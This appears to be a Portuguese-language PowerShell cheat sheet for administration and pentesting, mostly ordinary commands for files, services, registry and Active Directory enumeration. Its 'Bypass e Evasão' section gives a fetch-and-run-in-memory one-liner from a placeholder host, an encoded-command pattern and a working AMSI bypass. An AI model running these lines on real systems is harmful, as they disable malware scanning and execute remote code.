# 💙 PowerShell Cheatsheet - Comandos Essenciais

> Referência rápida de PowerShell para pentest, administração e automação

---

## 📚 Básico

### Navegação e Arquivos
```powershell
# Navegação
Get-Location          # pwd
Set-Location C:\      # cd
Get-ChildItem         # ls/dir
Get-ChildItem -Recurse -Filter *.txt

# Arquivos
Get-Content file.txt  # cat
Set-Content file.txt "texto"
Add-Content file.txt "mais texto"
Copy-Item source.txt dest.txt
Move-Item file.txt C:\Temp\
Remove-Item file.txt
Test-Path C:\file.txt

# Busca
Get-ChildItem -Recurse -Filter *.log
Get-ChildItem -Recurse | Select-String "password"
```

---

## 🖥️ Sistema

### Informações
```powershell
# Sistema operacional
Get-ComputerInfo
Get-WmiObject Win32_OperatingSystem
[System.Environment]::OSVersion

# Hardware
Get-WmiObject Win32_ComputerSystem
Get-WmiObject Win32_Processor
Get-WmiObject Win32_LogicalDisk

# Rede
Get-NetIPAddress
Get-NetRoute
Get-NetAdapter
Test-NetConnection google.com -Port 443
```

---

## 👥 Usuários e Grupos

```powershell
# Usuário atual
whoami
[Security.Principal.WindowsIdentity]::GetCurrent().Name

# Listar usuários locais
Get-LocalUser
Get-WmiObject Win32_UserAccount

# Grupos
Get-LocalGroup
Get-LocalGroupMember Administrators

# Mudar senha
Set-LocalUser -Name "usuario" -Password (ConvertTo-SecureString "NovaSenh@" -AsPlainText -Force)
```

---

## 🔐 Processos e Serviços

```powershell
# Processos
Get-Process
Get-Process -Name "chrome"
Stop-Process -Name "notepad" -Force
Start-Process notepad.exe

# Serviços
Get-Service
Start-Service -Name "spooler"
Stop-Service -Name "spooler"
Restart-Service -Name "spooler"
```

---

## 🌐 Network

```powershell
# Conexões
Get-NetTCPConnection
Get-NetTCPConnection -State Established
Get-NetTCPConnection -LocalPort 445

# Download
Invoke-WebRequest -Uri "http://site.com/file.txt" -OutFile "file.txt"
(New-Object Net.WebClient).DownloadFile("http://site.com/file.exe", "file.exe")

# Upload (POST)
Invoke-RestMethod -Uri "http://site.com/upload" -Method Post -InFile "data.txt"

# Port scan (simples)
1..1024 | ForEach-Object { Test-NetConnection localhost -Port $_ -WarningAction SilentlyContinue }
```

---

## 📜 Registry

```powershell
# Ler chave
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion"

# Criar chave
New-Item -Path "HKLM:\SOFTWARE\MeuApp"

# Definir valor
Set-ItemProperty -Path "HKLM:\SOFTWARE\MeuApp" -Name "Versao" -Value "1.0"

# Deletar
Remove-ItemProperty -Path "HKLM:\SOFTWARE\MeuApp" -Name "Versao"
```

---

## 🔍 Enumeração (Pentest)

```powershell
# Sistema
systeminfo
Get-HotFix  # Patches instalados

# Usuários privilegiados
Get-LocalGroupMember Administrators

# Tarefas agendadas
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}

# Shares
Get-SmbShare
Get-ChildItem \\servidor\share

# Firewall
Get-NetFirewallRule | Where-Object {$_.Enabled -eq "True"}
Get-NetFirewallProfile

# AntiVirus
Get-MpComputerStatus
Get-MpPreference
```

---

## 🎯 Active Directory

```powershell
# Importar módulo
Import-Module ActiveDirectory

# Usuários
Get-ADUser -Filter *
Get-ADUser -Identity "usuario"
Get-ADUser -Filter {Enabled -eq $true}

# Grupos
Get-ADGroup -Filter *
Get-ADGroupMember -Identity "Domain Admins"

# Computadores
Get-ADComputer -Filter *
Get-ADComputer -Filter {OperatingSystem -like "*Server*"}

# Domain Controllers
Get-ADDomainController
```

---

## 🛠️ One-Liners Úteis

```powershell
# Base64 encode/decode
[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("texto"))
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("dGV4dG8="))

# Hash de arquivo
Get-FileHash -Path file.exe -Algorithm SHA256

# HTTP Server simples
# PowerShell 5.1+
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add('http://+:8000/')
$listener.Start()

# Encontrar arquivos grandes
Get-ChildItem -Recurse | Where-Object {$_.Length -gt 100MB} | Sort-Object Length -Descending

# Arquivos modificados recentemente
Get-ChildItem -Recurse | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-1)}

# Usuários logados
Get-WmiObject Win32_LoggedOnUser | Select-Object Antecedent -Unique
```

---

## 🔓 Bypass e Evasão (Educacional)

```powershell
# Execution Policy
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Download e execute sem tocar disco
IEX (New-Object Net.WebClient).DownloadString('http://site.com/script.ps1')

# Comando ofuscado
powershell -EncodedCommand <base64>

# AMSI Bypass (exemplo educacional)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

⚠️ **Use apenas em labs autorizados!**

---

## 📝 Scripting

### Variáveis e Tipos
```powershell
$texto = "Hello"
$numero = 42
$array = @(1, 2, 3)
$hashtable = @{Name="João"; Age=30}
```

### Condicionais
```powershell
if ($numero -gt 10) {
    Write-Host "Maior que 10"
} elseif ($numero -eq 10) {
    Write-Host "Igual a 10"
} else {
    Write-Host "Menor que 10"
}
```

### Loops
```powershell
# ForEach
foreach ($item in $array) {
    Write-Host $item
}

# For
for ($i = 0; $i -lt 10; $i++) {
    Write-Host $i
}

# While
while ($condition) {
    # código
}
```

### Funções
```powershell
function Get-Greeting {
    param(
        [string]$Name
    )
    return "Olá, $Name!"
}

Get-Greeting -Name "João"
```

---

## 💡 Dicas

### Pipeline
```powershell
# Encadear comandos
Get-Process | Where-Object {$_.CPU -gt 100} | Sort-Object CPU -Descending | Select-Object -First 5

# Exportar
Get-Service | Export-Csv services.csv -NoTypeInformation
Get-Process | ConvertTo-Json | Out-File processes.json
```

### Aliases Comuns
```powershell
ls, dir → Get-ChildItem
cd → Set-Location
cat → Get-Content
cp → Copy-Item
mv → Move-Item
rm → Remove-Item
ps → Get-Process
kill → Stop-Process
```

---

## 📚 Recursos

- [Microsoft Docs](https://docs.microsoft.com/powershell)
- [SS64 PowerShell](https://ss64.com/ps/)
- [PowerShell Gallery](https://powershellgallery.com)

---

<div align="center">

**💙 PowerShell is powerful**

*Domine o shell azul do Windows*

</div>
